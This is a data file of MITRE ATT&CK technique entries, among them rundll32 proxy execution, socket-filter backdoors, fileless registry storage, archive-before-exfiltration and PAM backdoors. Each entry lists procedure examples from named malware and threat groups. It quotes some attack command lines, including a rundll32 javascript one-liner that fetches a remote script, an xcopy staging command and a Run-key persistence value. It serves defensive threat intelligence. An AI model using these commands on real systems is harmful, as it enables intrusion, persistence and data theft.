T1205.002,Socket Filters,"Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the `libpcap` library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.  To establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria. Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with [Protocol Tunneling]  Filters can be installed on any Unix-like platform with `libpcap` installed or on Windows hosts using `Winpcap`.  Adversaries may use either `libpcap` with `pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER` options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.","['[PITSTOP] can listen and evaluate incoming commands on the domain socket, created by PITHOOK malware, located at `/data/runtime/cockpit/wd.fd` for a predefined magic byte sequence. [PITSTOP] can then duplicate the socket for further communication over TLS.', '[Penquin] installs a `TCP` and `UDP` filter on the `eth0` interface.']",False
T1560.001,Archive via Utility,"Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.  Adversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows systems.   On Windows, <code>diantz</code> or <code> makecab</code> may be used to package collected files into a cabinet (.cab) file. <code>diantz</code> may also be used to download and compress files from remote locations (i.e. [Remote Data Staging] <code>xcopy</code> on Windows can copy files and directories with a variety of options. Additionally, adversaries may use [certutil] to Base64 encode collected data before exfiltration.   Adversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.","['[Crutch] has used the WinRAR utility to compress and encrypt stolen files.', '[Okrum] was seen using a RAR archiver tool to compress/decompress data.', '[HAFNIUM] has used 7-Zip and WinRAR to compress stolen files for exfiltration.', '[certutil] may be used to Base64 encode collected data.', 'During [Operation CuckooBees] the threat actors used the Makecab utility to compress and a version of WinRAR to create password-protected archives of stolen data prior to exfiltration.', '[menuPass] has compressed files before exfiltration using TAR and RAR.', '[Wizard Spider] has archived data into ZIP files on compromised machines.', '[APT33] has used WinRAR to compress data prior to exfil.\t ', '[ccf32] has used `xcopy \\\\<target_host>\\c$\\users\\public\\path.7z c:\\users\\public\\bin\\<target_host>.7z /H /Y` to archive collected files.', '[Fox Kitten] has used 7-Zip to archive data.', '[CopyKittens] uses ZPP, a .NET console program, to compress files with ZIP.', '[Volt Typhoon] has archived the ntds.dit database as a multi-volume password-protected archive with 7-Zip.', '[InvisiMole] uses WinRAR to compress data that is intended to be exfiltrated.', '[APT1] has used RAR to compress files before moving them outside of the victim network.', '[Mustang Panda] has used RAR to create password-protected archives of collected documents prior to exfiltration.', '[Chimera] has used gzip for Linux OS and a modified RAR software to archive data on Windows hosts.', '[DustySky] can compress files via RAR while staging data to be exfiltrated.', '[Gallmaker] has used WinZip, likely to archive data prior to exfiltration.', '[Daserf] hides collected data in password-protected .rar archives.', '[APT39] has used WinRAR and 7-Zip to compress an archive stolen data.', '[PoshC2] contains a module for compressing data using ZIP.', 'During [Operation Wocao] threat actors archived collected files with WinRAR, prior to exfiltration.', '[APT5] has used the JAR/ZIP file format for exfiltrated files.', '[PUNCHBUGGY] has Gzipped information and saved it to a random temp file before exfil.\t', '[Ramsay] can compress and archive collected files using WinRAR.', 'During [FunnyDream] the threat actors used 7zr.exe to add collected files to an archive.', '[Turian] can use WinRAR to create a password-protected archive for files of interest.', '[GALLIUM] used WinRAR to compress and encrypt stolen data prior to exfiltration.', '[APT41] created a RAR archive of targeted files for exfiltration.', '[IceApple] can encrypt and compress files using Gzip prior to exfiltration.', '[MuddyWater] has used the native Windows cabinet creation tool, makecab.exe, likely to compress stolen data to be uploaded.', '[APT28] has used a variety of utilities, including WinRAR, to archive collected data with password protection.', '[iKitten] will zip up the /Library/Keychains directory before exfiltrating it.', '[WindTail] has the ability to use the macOS built-in zip utility to archive files.', 'During [C0026] the threat actors used WinRAR to collect documents on targeted systems. The threat actors appeared to only exfiltrate files created after January 1, 2021.', '[Turla] has encrypted files stolen from connected USB drives into a RAR file before exfiltration.', '[CORALDECK] has created password-protected RAR, WinImage, and zip archives to be exfiltrated.', '[Sowbug] extracted documents and bundled them into a RAR archive.', ""[Micropsia] creates a RAR archive based on collected files on the victim's machine."", 'During [Operation Honeybee] the threat actors uses zip to pack collected files before exfiltration.', '[BRONZE BUTLER] has compressed data into password-protected RAR archives prior to exfiltration.', 'During [Cutting Edge] threat actors saved collected data to a tar archive.', '[Octopus] has compressed data before exfiltrating it using a tool called Abbrevia. ', '[Kimsuky] has used QuickZip to archive stolen files before exfiltration.', '[APT3] has used tools to compress data before exfilling it.', '[OopsIE] compresses collected files with GZipStream before sending them to its C2 server.', '[FIN8] has used RAR to compress collected data before exfiltration.', '[Ke3chang] is known to use 7Zip and RAR with passwords to encrypt data prior to exfiltration.', '[Calisto] uses the <code>zip -r</code> command to compress the data collected on the local system.', '[FIN13] has compressed the dump output of compromised credentials with a 7zip binary.', '[Earth Lusca] has used WinRAR to compress stolen files into an archive prior to exfiltration.', '[Pupy] can compress data with Zip before sending it over C2.', '[Rclone] can compress files using `gzip` prior to exfiltration.', '[Magic Hound] has used gzip to archive dumped LSASS process memory and RAR to stage and compress local folders.', '[PowerShower] has used 7Zip to compress .txt, .pdf, .xls or .doc files prior to exfiltration.', '[AppleSeed] can zip and encrypt data collected on a target system.', '[Aquatic Panda] has used WinRAR to compress memory dumps prior to exfiltration.', 'During the [SolarWinds Compromise] [APT29] used 7-Zip to compress stolen emails into password-protected archives prior to exfltration; [APT29] also compressed text files into zipped archives.', '[PoetRAT] has the ability to compress files with zip.', '[Akira] uses utilities such as WinRAR to archive data prior to exfiltration.', ""During [Operation Dream Job] [Lazarus Group] archived victim's data into a RAR file."", '[ToddyCat] has leveraged  xcopy, 7zip, and RAR to stage and compress collected documents prior to exfiltration.', '[UNC2452] used 7-Zip to compress stolen emails into password-protected archives prior to exfiltration.', '[APT29] used 7-Zip to compress stolen emails into password-protected archives prior to exfiltration; [APT29] has also compressed text files into zipped archives.', '[Operation Wocao] has archived collected files with WinRAR, prior to exfiltration.']",False
T1021.005,VNC,"Adversaries may use [Valid Accounts] to remotely control machines using Virtual Network Computing (VNC).  VNC is a platform-independent desktop sharing system that uses the RFB (“remote framebuffer”) protocol to enable users to remotely control another computer’s display by relaying the screen, mouse, and keyboard inputs over the network.  VNC differs from [Remote Desktop Protocol] as VNC is screen-sharing software rather than resource-sharing software. By default, VNC uses the system's authentication, but it can be configured to use credentials specific to VNC.  Adversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands. An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network. Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.","['[ZxShell] supports functionality for VNC sessions. ', '[Gamaredon Group] has used VNC tools, including UltraVNC, to remotely interact with compromised hosts.', '[FIN7] has used TightVNC to control compromised hosts.', '[DanBot] can use VNC for remote access to targeted systems.', '[Carberp] can start a remote VNC session by downloading a new plugin.', '[GCMAN] uses VNC for lateral movement.', '[Fox Kitten] has installed TightVNC server and client on compromised servers and endpoints for lateral movement.', '[TrickBot] has used a VNC module to monitor the victim and collect information to pivot to valuable systems on the network ', '[Proton] uses VNC to connect into systems.', '[WarzoneRAT] has the ability of performing remote desktop access via a VNC console.']",
T1027.011,Fileless Storage,"Adversaries may store data in ""fileless"" formats to conceal malicious activity from defenses. Fileless storage can be broadly defined as any format other than a file. Common examples of non-volatile fileless storage include the Windows Registry, event logs, or WMI repository.  Similar to fileless in-memory behaviors such as [Reflective Code Loading] and [Process Injection] fileless data storage may remain undetected by anti-virus and other endpoint security tools that can only access specific file formats from disk storage.  Adversaries may use fileless storage to conceal various types of stored data, including payloads/shellcode (potentially being used as part of [Persistence] and collected data not yet exfiltrated from the victim (e.g., [Local Data Staging] Adversaries also often encrypt, encode, splice, or otherwise obfuscate this fileless data when stored.  Some forms of fileless storage activity may indirectly create artifacts in the file system, but in central and otherwise difficult to inspect formats such as the WMI (e.g., `%SystemRoot%\System32\Wbem\Repository`) or Registry (e.g., `%SystemRoot%\System32\Config`) physical files. ","['[DarkWatchman] can store configuration strings, keylogger, and output of components in the Registry.', '[PolyglotDuke] can store encrypted JSON configuration files in the Registry.', '[QakBot] can store its configuration information in a randomly named subkey under <code>HKCU\\Software\\Microsoft</code>.', '[TYPEFRAME] can install and store encrypted configuration data under the Registry key <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellCompatibility\\Applications\\laxhost.dll</code> and <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PrintConfigs</code>.', '[ComRAT] has stored encrypted orchestrator code and payloads in the Registry. ', '[ShadowPad] maintains a configuration block and virtual file system in the Registry.', '[Gelsemium] can store its components in the Registry.', '[Uroburos] can store configuration information for the kernel driver and kernel driver loader components in an encrypted blob typically found at `HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds.`', '[SysUpdate] can store its encoded configuration file within <code>Software\\Classes\\scConfig</code> in either <code>HKEY_LOCAL_MACHINE</code> or <code>HKEY_CURRENT_USER</code>.', ""[Exaramel for Windows] stores the backdoor's configuration in the Registry in XML format."", '[Grandoreiro] can store its configuration in the Registry at `HKCU\\Software\\` under frequently changing names including <code>%USERNAME%</code> and <code>ToolTech-RM</code>.', '[NETWIRE] can store its configuration information in the Registry under `HKCU:\\Software\\Netwire`.', '[Pillowmint] has stored a compressed payload in the Registry key <code>HKLM\\SOFTWARE\\Microsoft\\DRM</code>.', '[TinyTurla] can save its configuration parameters in the Registry.', '[CHOPSTICK] may store RC4 encrypted configuration information in the Windows Registry.', '[APT32] backdoor has stored its configuration in a registry key.', '[QUADAGENT] stores a session identifier unique to the compromised system as well as a pre-shared key used for encrypting and decrypting C2 communications within a Registry key (such as `HKCU\\Office365DCOMCheck`) in the `HKCU` hive.', '[RegDuke] can store its encryption key in the Registry.', '[ThreatNeedle] can save its configuration data as a RC4-encrypted Registry key under `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\GameCon`.', 'During [Operation CuckooBees] the threat actors stroed payloads in Windows CLFS (Common Log File System) transactional logs.', '[Valak] has the ability to store information regarding the C2 server and downloads in the Registry key <code>HKCU\\Software\\ApplicationContainer\\Appsw64</code>.', '[Volgmer] stores an encoded configuration file in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Security</code>.', 'Some versions of [Chaes] stored its instructions (otherwise in a `instructions.ini` file) in the Registry. ', '[Turla] has used the Registry to store encrypted and encoded payloads.', '[RCSession] can store its obfuscated configuration file in the Registry under `HKLM\\SOFTWARE\\Plus` or `HKCU\\SOFTWARE\\Plus`.', '[Sibot] has installed a second-stage script in the <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\sibot</code> registry key.', '[PipeMon] has stored its encrypted payload in the Registry under `HKLM\\SOFTWARE\\Microsoft\\Print\\Components\\`.', '[REvil] can save encryption parameters and system information in the Registry.', '[Mosquito] stores configuration values under the Registry key <code>HKCU\\Software\\Microsoft\\[dllname]</code>.']",False
T1218.011,Rundll32,"Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules] may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).  Rundll32.exe can also be used to execute [Control Panel] Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute.   Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https[:]//www[.]example[.]com/malicious.sct"")""</code>  This behavior has been seen used by malware such as Poweliks.   Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones. DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).  Additionally, adversaries may use [Masquerading] techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload. ","['During [Operation Dream Job] [Lazarus Group] executed malware with `C:\\\\windows\\system32\\rundll32.exe ""C:\\ProgramData\\ThumbNail\\thumbnail.db""`, `CtrlPanel S-6-81-3811-75432205-060098-6872 0 0 905`.', '[InvisiMole] has used rundll32.exe for execution.', 'During [C0021] the threat actors used `rundll32.exe` to execute the [Cobalt Strike] Beacon loader DLL.', '[PUNCHBUGGY] can load a DLL using Rundll32.', '[BoomBox] can use RunDLL32 for execution.', '[ADVSTORESHELL] has used rundll32.exe in a Registry value to establish persistence.', '[Briba] uses rundll32 within [Registry Run Keys / Startup Folder] entries to execute malicious DLLs.', '[MegaCortex] has used <code>rundll32.exe</code> to load a DLL for file encryption.', '[SVCReady] has used `rundll32.exe` for execution.', '[GreyEnergy] uses PsExec locally in order to execute rundll32.exe at the highest privileges (NTAUTHORITY\\SYSTEM).', '[StreamEx] uses rundll32 to call an exported function.', 'Variants of [Emissary] have used rundll32.exe in Registry values added to establish persistence.', '[PowerDuke] uses rundll32.exe to load.', '[Mosquito] launcher uses rundll32.exe in a Registry Key value to start the main backdoor capability.', '[Prikormka] uses rundll32.exe to load its DLL.', '[Egregor] has used rundll32 during execution.', '[Gamaredon Group] malware has used rundll32 to launch additional malicious components.', '[PolyglotDuke] can be executed using rundll32.exe.', 'After copying itself to a DLL file, a variant of [Elise] calls the DLL file using rundll32.exe.', '[FIN7] has used `rundll32.exe` to execute malware on a compromised network. ', '[APT19] configured its payload to inject into the rundll32.exe.', '[Attor] installer plugin can schedule rundll32.exe to load the dispatcher.', '[FunnyDream] can use `rundll32` for execution of its components.', ""[Kimsuky] has used `rundll32.exe` to execute malicious scripts and malware on a victim's network."", '[EnvyScout] has the ability to proxy execution of malicious files with Rundll32.', '[Backdoor.Oldrea] can use rundll32 for execution on compromised hosts.', 'During [C0015] the threat actors loaded DLLs via `rundll32` using the `svchost` process.', '[Carbanak] installs VNC server software that executes through rundll32.', '[APT3] has a tool that can run DLLs.', '[Magic Hound] has used rundll32.exe to execute MiniDump from comsvcs.dll when dumping LSASS memory.', '[TA551] has used rundll32.exe to load malicious DLLs.', '[Mispadu] uses RunDLL32 for execution via its injector DLL.', '[DDKONG] uses Rundll32 to ensure only a single instance of itself is running at once.', 'A [gh0st RAT] variant has used rundll32 for execution.', '[SDBbot] has used rundll32.exe to execute DLLs.', '[Blue Mockingbird] has executed custom-compiled XMRIG miner DLLs using rundll32.exe.', '[Wizard Spider] has utilized `rundll32.exe` to deploy ransomware commands with the use of WebDAV.', 'The [Winnti for Windows] installer loads a DLL using rundll32.', 'The [CozyCar] dropper copies the system file rundll32.exe to the install location for the malware, then uses the copy of rundll32.exe to load and execute the main [CozyCar] component.', '[DEADEYE] can use `rundll32.exe` for execution of living off the land binaries (lolbin) such as `SHELL32.DLL`.', '[APT32] malware has used rundll32.exe to execute an initial infection process.', '[Heyoka Backdoor] can use rundll32.exe to gain execution.', '[Mongall] can use `rundll32.exe` for execution.', '[SUNBURST] used Rundll32 to execute payloads. ', '[Bumblebee] has used `rundll32` for execution of the loader component.', '[Lazarus Group] has used rundll32 to execute malicious payloads on a compromised host.', '[TA505] has leveraged <code>rundll32.exe</code> to execute malicious DLLs.', '[Bad Rabbit] has used rundll32 to launch a malicious DLL as <code>C:Windowsinfpub.dat</code>.', '[PcShare] has used `rundll32.exe` for execution.', '[CopyKittens] uses rundll32 to load various tools on victims, including a lateral movement tool named Vminst, Cobalt Strike, and shellcode.', '[APT41] has used rundll32.exe to execute a loader.', '[FlawedAmmyy] has used `rundll32` for execution.', '[Ninja] loader components can be executed through rundll32.exe.', 'During the [SolarWinds Compromise] [APT29] used `Rundll32.exe` to execute payloads.', '[Sandworm Team] used a backdoor which could execute a supplied DLL using rundll32.exe.\t', '[APT28] executed [CHOPSTICK] by using rundll32 commands such as <code>rundll32.exe “C:\\Windows\\twain_64.dll”</code>. [APT28] also executed a .dll for a first stage dropper using rundll32.exe. An [APT28] loader Trojan saved a batch script that uses rundll32 to execute a DLL payload.', '[Bisonal] has used rundll32.exe to execute as part of the Registry Run key it adds: <code>HKEY_CURRENT_USER \\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\”vert” = “rundll32.exe c:\\windows\\temp\\pvcu.dll , Qszdez”</code>.', '[HAFNIUM] has used <code>rundll32</code> to load malicious DLLs.', '[USBferry] can execute rundll32.exe in memory to avoid detection.\t', '[Pteranodon] executes functions using rundll32.exe.', 'During the [2015 Ukraine Electric Power Attack] [Sandworm Team] used a backdoor which could execute a supplied DLL using `rundll32.exe`. ', '[NativeZone] has used rundll32 to execute a malicious DLL.', '[Sakula] calls cmd.exe to run various DLL files via rundll32.', '[ZxShell] has used rundll32.exe to execute other DLLs and named pipes. ', '[ServHelper] contains a module for downloading and executing DLLs that leverages <code>rundll32.exe</code>.', '[NOKKI] has used rundll32 for execution.', '[FatDuke] can execute via rundll32.', '[RTM] runs its core DLL file using rundll32.exe.', '[Kwampirs] uses rundll32.exe in a Registry value added to establish persistence.', '[KONNI] has used Rundll32 to execute its loader for privilege escalation purposes.', '[FELIXROOT] uses Rundll32 for executing the dropper program.', 'During [Operation Spalax] the threat actors used `rundll32.exe` to execute malicious installers.', '[Sibot] has executed downloaded DLLs with <code>rundll32.exe</code>.', '[Comnie] uses Rundll32 to load a malicious DLL.', '[EVILNUM] can execute commands and scripts through rundll32. ', '[APT38] has used rundll32.exe to execute binaries, scripts, and Control Panel Item files and to execute code via proxy to avoid triggering security tools.', '[BLINDINGCAN] has used Rundll32 to load a malicious DLL.', '[CORESHELL] is installed via execution of rundll32 with an export named ""init"" or ""InitW.""', '[Matryoshka] uses rundll32.exe in a Registry Run key value for execution as part of its persistence mechanism.', 'Rundll32.exe is used as a way of executing [Flame] at the command-line.', '[LazyScripter] has used `rundll32.exe` to execute [Koadic] stagers. ', '[NotPetya] uses <code>rundll32.exe</code> to install itself on remote systems when accessed via [PsExec] or <code>wmic</code>.', '[Cobalt Strike] can use `rundll32.exe` to load DLL from the command line.', '[JHUHUGIT] is executed using rundll32.exe.', '[HermeticWizard] has the ability to create a new process using `rundll32`.', '[Ragnar Locker] has used rundll32.exe to execute components of VirtualBox.', '[MuddyWater] has used malware that leveraged rundll32.exe in a Registry Run key to execute a .dll.', '[QakBot] has used Rundll32.exe to drop malicious DLLs including [Brute Ratel C4] and to enable C2 communication.', '[Squirrelwaffle] has been executed using `rundll32.exe`.', '[Koadic] can use Rundll32 to execute additional payloads.', 'During [C0018] the threat actors used `rundll32` to run [Mimikatz]', '[UNC2452] used Rundll32 to execute payloads.', '[APT29] has used <code>Rundll32.exe</code> to execute payloads.']",False
T1583.007,Serverless,"Adversaries may purchase and configure serverless cloud infrastructure, such as Cloudflare Workers or AWS Lambda functions, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them.  Once acquired, the serverless runtime environment can be leveraged to either respond directly to infected machines or to [Proxy] traffic to an adversary-owned command and control server. As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers.",[],False
T1132.001,Standard Encoding,"Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME. Some data encoding systems may also result in data compression, such as gzip.","['[SideTwist] has used Base64 for encoded C2 traffic.', '[Fysbis] can use Base64 to encode its C2 traffic.', '[DnsSystem] can Base64 encode data sent to C2.', 'C2 traffic from [ADVSTORESHELL] is encrypted, then encoded with Base64 encoding.', '[Flagpro] has encoded bidirectional data communications between a target system and C2 server using Base64. ', '[Stuxnet] transforms encrypted binary data into an ASCII string in order to use it as a URL parameter value.', '[SeaDuke] C2 traffic is base64-encoded.', '[Sandworm Team] BCS-server tool uses base64 encoding and HTML tags for the communication traffic between the C2 server.\t', '[SysUpdate] has used Base64 to encode its C2 traffic. ', '[Chaes] has used Base64 to encode C2 communications. ', '[Kevin] can Base32 encode chunks of output files during exfiltration.', '[down_new] has the ability to base64 encode C2 communications.', '[Patchwork] used Base64 to encode C2 traffic.', '[Torisma] has encoded C2 communications with Base64.', 'A [JHUHUGIT] variant encodes C2 POST data base64.', '[SUNBURST] used Base64 encoding in its C2 traffic.', '[Mafalda] can encode data using Base64 prior to exfiltration.', '[SMOKEDHAM] has encoded its C2 traffic with Base64.', '[SLIGHTPULSE] can base64 encode all incoming and outgoing C2 messages.', '[CORESHELL] C2 messages are Base64-encoded.', '[QUADAGENT] encodes C2 communications with base64.', '[Astaroth] encodes data using Base64 before sending it to the C2 server. ', '[ChChes] can encode C2 data with a custom technique that utilizes Base64.\t', '[RotaJakiro] uses ZLIB Compression to compresses data sent to the C2 server in the `payload` section network communication packet.', '[BLINDINGCAN] has encoded its C2 traffic with Base64.', '[Emotet] has used Google’s Protobufs to serialize data sent to and from the C2 server.', '[Octopus] has encoded C2 communications in Base64.', '[Daserf] uses custom base64 encoding to obfuscate HTTP traffic.', '[RDAT] can communicate with the C2 via base32-encoded subdomains.\t', 'Responses from the [Pisloader] C2 server are base32-encoded.', '[GrimAgent] can base64 encode C2 replies.', '[STEADYPULSE] can transmit URL encoded data over C2.', 'Several [BRONZE BUTLER] tools encode data with base64 when posting it to a C2 server.', '[Spark] has encoded communications with the C2 server with base64. ', '[MechaFlounder] has the ability to use base16 encoded strings in C2.', '[Denis] encodes the data sent to the server in Base64.', '[OopsIE] encodes data in hexadecimal format over the C2 channel.', '[Kazuar] encodes communications to the C2 server in Base64.', '[Machete] has used base64 encoding.', '[PingPull] can encode C2 traffic with Base64.', '[TA551] has used encoded ASCII text for initial C2 communications.', '[Revenge RAT] uses Base64 to encode information sent to the C2 server.', '[OSX_OCEANLOTUS.D] has used `zlib` to compress all data after 0x52 for the custom TCP C2 protocol.', '[POWERSTATS] encoded C2 traffic with base64.', 'Some [Backdoor.Oldrea] samples use standard Base64 + bzip2, and some use standard Base64 + reverse XOR + RSA-2048 to decrypt data received from C2 servers.', '[HOPLIGHT] has utilized Zlib compression to obfuscate the communications payload. \t ', '[Okrum] has used base64 to encode C2 communication.', '[Squirrelwaffle] has encoded its communications to C2 servers using Base64.', '[BADNEWS] encodes C2 traffic with base64.', '[Bumblebee] has the ability to base64 encode C2 server responses.', '[njRAT] uses Base64 encoding for C2 traffic.', '[TrickBot] can Base64-encode C2 commands.', '[Mis-Type] uses Base64 encoding for C2 traffic.', '[AutoIt backdoor] has sent a C2 response that was base64-encoded.', '[S-Type] uses Base64 encoding for C2 traffic.', 'A [Lazarus Group] malware sample encodes data with base64.', '[DarkWatchman] encodes data using hexadecimal representation before sending it to the C2 server.', '[Dipsind] encodes C2 traffic with base64.', '[RogueRobin] base64 encodes strings that are sent to the C2 over its DNS tunnel.', '[WellMess] has used Base64 encoding to uniquely identify communication to and from the C2.', '[PULSECHECK] can base-64 encode encrypted data sent through C2.', '[Kessel] has exfiltrated data via hexadecimal-encoded subdomain fields of DNS queries.', '[Tropic Trooper] has used base64 encoding to hide command strings delivered from the C2.', '[BabyShark] has encoded data using [certutil] before exfiltration.', '[Ixeshe] uses custom Base64 encoding schemes to obfuscate command and control traffic in the message body of HTTP requests.', '[CreepySnail] can use Base64 to encode its C2 traffic.', '[PowerShower] has the ability to encode C2 communications with base64 encoding.', '[Prikormka] encodes C2 traffic with Base64.', '[KONNI] has used a custom base64 key to encode stolen data before exfiltration.', '[Bisonal] has encoded binary data with Base64 and ASCII. ', '[Misdat] network traffic is Base64-encoded plaintext.', '[MuddyWater] has used tools to encode C2 communications including Base64 encoding.', '[Cobian RAT] obfuscates communications with the C2 server using Base64 encoding.', '[BS2005] uses Base64 encoding for communication in the message body of an HTTP request.', '[Mongall] can use Base64 to encode information sent to its C2.', '[More_eggs] has used basE91 encoding, along with encryption, for C2 communication.', '[Sardonic] can encode client ID data in 32 uppercase hex characters and transfer to the actor-controlled C2 server.', '[Samurai] can base64 encode data sent in C2 communications prior to its encryption.', '[xCaon] has used Base64 to encode its C2 traffic.', '[WIREFIRE] can Base64 encode process output sent to C2.', '[POWRUNER] can use base64 encoded C2 communications.', 'Some [Felismus] samples use a custom method for C2 traffic that utilizes Base64.', '[Valak] has returned C2 data as encoded ASCII.', '[SpeakUp] encodes C&C communication using Base64. ', '[Mori] can use Base64 encoded JSON libraries used in C2.', '[Ebury] has encoded C2 traffic in hexadecimal format.\t', '[gh0st RAT] has used Zlib to compress C2 communications data before encrypting it.', '[Elise] exfiltrates data using cookie values that are Base64-encoded.', '[Cobalt Strike] can use Base64, URL-safe Base64, or NetBIOS encoding in its C2 traffic.', 'An [APT19] HTTP malware variant used Base64 to encode communications to the C2 server.', '[QakBot] can Base64 encode system information sent to C2.', '[Zebrocy] has used URL/Percent Encoding on data exfiltrated via HTTP POST requests.', '[Carbanak] encodes the message body of HTTP traffic with Base64.', '[Sliver] can use standard encoding techniques like gzip and hex to ASCII to encode the C2 communication payload.', '[WARPWIRE] can Base64 encode captured credentials with `btoa()` prior to sending to C2.', '[APT33] has used base64 to encode command and control traffic.', '[STARWHALE] has the ability to hex-encode collected data from an infected host.', '[CharmPower] can send additional modules over C2 encoded with base64.', 'For C2 over HTTP, [Helminth] encodes data with base64 and sends it via the ""Cookie"" field of HTTP requests. For C2 over DNS, [Helminth] converts ASCII characters into their hexadecimal values and sends the data in cleartext.', '[Saint Bot] has used Base64 to encode its C2 communications.', '[QUIETCANARY] can base64 encode C2 communications.', '[Ramsay] has used base64 to encode its C2 traffic.', '[HAFNIUM] has used ASCII encoding for C2 traffic.', '[GLASSTOKEN] has hexadecimal and Base64 encoded C2 content.']",False
T1027.009,Embedded Payloads,"Adversaries may embed payloads within other files to conceal malicious content from defenses. Otherwise seemingly benign files (such as scripts and executables) may be abused to carry and obfuscate malicious payloads and content. In some cases, embedded payloads may also enable adversaries to [Subvert Trust Controls] by not impacting execution controls such as digital signatures and notarization tickets.   Adversaries may embed payloads in various file formats to hide payloads. This is similar to [Steganography] though does not involve weaving malicious content into specific bytes and patterns related to legitimate digital media formats.   For example, adversaries have been observed embedding payloads within or as an overlay of an otherwise benign binary. Adversaries have also been observed nesting payloads (such as executables and run-only scripts) inside a file of the same format.   Embedded content may also be used as [Process Injection] payloads used to infect benign system processes. These embedded then injected payloads may be used as part of the modules of malware designed to provide specific features such as encrypting C2 communications in support of an orchestrator module. For example, an embedded module may be injected into default browsers, allowing adversaries to then communicate via the network.","[' The DEADEYE.EMBED variant of [DEADEYE] has the ability to embed payloads inside of a compiled binary.', '[BADHATCH] has an embedded second stage DLL payload within the first stage of the malware.', '[Emotet] has dropped an embedded executable at `%Temp%\\setup.exe`.', '[macOS.OSAMiner] has embedded [Stripped Payloads] within another run-only [Stripped Payloads]', '[Dtrack] has used a dropper that embeds an encrypted payload as extra data.', '[Netwalker] DLL has been embedded within the PowerShell script in hex format.', 'The [SMOKEDHAM] source code is embedded in the dropper as an encrypted string.', '[ComRAT] has embedded a XOR encrypted communications module inside the orchestrator module. ', '[Invoke-PSImage] can be used to embed payload data within a new image file.', 'For [C0021] the threat actors embedded a base64-encoded payload within a LNK file.', 'The [Uroburos] Queue file contains embedded executable files along with key material, communication channels, and modes of operation.']",False
T1556.003,Pluggable Authentication Modules,"Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.  Adversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials.  Malicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.","['[Ebury] can deactivate PAM modules to tamper with the sshd configuration.', '[Skidmap] has the ability to replace the pam_unix.so file on an infected machine with its own malicious version that accepts a specific backdoor password for all users.']",
T1578.004,Revert Cloud Instance,"An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs.  Another variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM.",[],
